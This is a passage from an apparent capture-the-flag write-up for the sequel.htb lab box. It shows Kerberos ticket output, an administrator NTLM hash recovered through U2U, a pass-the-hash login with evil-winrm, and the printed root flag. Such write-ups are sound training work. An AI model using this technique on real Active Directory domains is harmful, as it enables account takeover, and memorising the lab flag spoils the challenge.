onJm8WkhGVQGdcbazN3sTLLx5maTfJkzlBIRfLFYoaKOZvI5n/erN9SeMSIv6YzbH6GNQm1uCFXAnt6HrJjy0Du31FTicyMiAHkjt1zQ/Me0Tbcd/Nznfi7w9p9OqC51vqOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEEEdwAZjSU46l/w3v+unaXzuhDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAADhAAClERgPMjAyNTAyMTUwNTA5MTdaphEYDzIwMjUwMjE1MTUwOTE3WqcRGA8yMDI1MDIyMjA1MDkxN1qoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  2/14/2025 9:09:17 PM
  EndTime                  :  2/15/2025 7:09:17 AM
  RenewTill                :  2/21/2025 9:09:17 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  R3ABmNJTjqX/De/66dpfOw==
  ASREP (key)              :  B87687F1FF309AB280258F84B1A85FEC

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

And we got the NTLM hash of the Administrator account. Let’s use this hash to get into the machine as administrator.

```apache
evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739567552728/52092010-1fa4-4fde-bbb5-0dfd553ee30f.png align="center")

Let’s now get our final flag.

```apache
type root.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739567630660/b1bcf59c-ac5a-4ccd-b5fa-91e2d5faa584.png align="center")

Flag: ***0a00120439c22acabe8d5d0a46ec2654***

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739567680823/defebb59-12df-4399-9d4a-89a9fe6864a3.png align="center")